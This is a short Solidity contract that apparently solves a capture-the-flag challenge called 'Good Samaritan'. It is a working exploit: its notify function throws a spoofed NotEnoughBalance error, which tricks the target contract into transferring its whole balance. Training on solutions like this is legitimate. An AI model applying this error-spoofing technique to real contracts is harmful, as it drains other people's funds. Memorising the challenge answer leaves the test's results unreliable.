// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

contract Solve is INotifyable {
    error NotEnoughBalance();
    GoodSamaritan challengeContract =
        GoodSamaritan(0x6Ca027E6485D12b0bD9e2f260E7dF59b30571dD0);

    function notify(uint256 amount) public pure override {
        // We only revert the initial transfer of 10 tokens, not the
        // remainder transfer of however many tokens it is (greater than 10)
        if (amount == 10) revert NotEnoughBalance();
    }

    function requestDonation() public {
        challengeContract.requestDonation();
    }
}
